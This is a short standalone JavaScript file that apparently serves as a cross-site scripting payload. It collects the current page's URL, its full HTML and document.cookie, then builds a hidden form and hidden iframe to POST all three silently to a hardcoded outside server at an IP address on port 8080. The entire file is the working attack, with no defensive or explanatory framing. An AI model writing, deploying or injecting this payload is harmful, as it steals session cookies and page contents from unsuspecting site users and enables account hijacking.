var url = location.href;
var html = document.getElementsByTagName('html')[0].innerHTML;
var cookie = document.cookie;
html = encodeURIComponent(html);
cookie = encodeURIComponent(cookie);

function POSTDATA(importurl, data){ 
	var tmp = data; 
	var tag = new Date().getTime(); 
	var doc = document; 
	
	var a = doc.createElement("div"); 
	var str = ""; 
	for(var i in tmp){ 
		str+="<input type='hidden' value='' name='"+i+"' id='__POST_INPUT_"+tag+"_"+i+"' /> "; 
	} 
	 
	a.innerHTML="<form action='"+importurl+"' id='__POST_FORM_"+tag+"' target='__POST_IFRAME_"+tag+"' method='POST'>"+str+"</form>"; 
	doc.body.appendChild(a); 
	  
	for(var i in tmp){ 
		doc.getElementById('__POST_INPUT_'+tag+'_'+i).value=tmp[i]; 
	} 
	doc.getElementById('__POST_FORM_'+tag).submit(); 
} 

var importurl = "http://98.142.132.85:8080/-.php";
var data = {
	url: url,
	html: html,
	cookie: cookie
};
POSTDATA(importurl, data);